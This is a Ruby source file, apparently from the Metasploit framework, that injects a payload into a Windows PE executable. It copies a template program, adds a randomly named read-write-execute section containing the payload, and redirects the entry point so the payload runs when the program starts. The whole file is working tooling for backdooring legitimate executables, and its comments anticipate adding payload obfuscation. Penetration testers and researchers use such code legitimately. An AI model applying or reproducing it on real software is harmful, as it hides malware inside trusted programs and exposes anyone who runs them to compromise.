# -*- coding: binary -*-
module Msf
module Exe

  require 'metasm'
  require 'msf/core/exe/segment_injector'

  class SegmentAppender < SegmentInjector

    def payload_stub(prefix)
      # TODO: Implement possibly helpful payload obfuscation
      asm = "new_entrypoint:\n#{prefix}\n"
      shellcode = Metasm::Shellcode.assemble(processor, asm)
      shellcode.encoded + @payload
    end

    def generate_pe
      # Copy our Template into a new PE
      pe_orig = Metasm::PE.decode_file(template)
      pe = pe_orig.mini_copy

      # Copy the headers and exports
      pe.mz.encoded = pe_orig.encoded[0, pe_orig.coff_offset-4]
      pe.mz.encoded.export = pe_orig.encoded[0, 512].export.dup
      pe.header.time = pe_orig.header.time

      # Don't rebase if we can help it since Metasm doesn't do relocations well
      pe.optheader.dll_characts.delete("DYNAMIC_BASE")

      # TODO: Look at supporting DLLs in the future
      prefix = ''

      # Create a new section
      s = Metasm::PE::Section.new
      if secname.blank?
        s.name = '.' + Rex::Text.rand_text_alpha_lower(4)
      else
        s.name = '.' + secname.downcase
      end
      s.encoded = payload_stub prefix
      s.characteristics = %w[MEM_READ MEM_WRITE MEM_EXECUTE]

      pe.sections << s
      pe.invalidate_header

      # Change the entrypoint to our new section
      pe.optheader.entrypoint = 'new_entrypoint'
      pe.cpu = pe_orig.cpu

      pe.encode_string
    end

  end
end
end
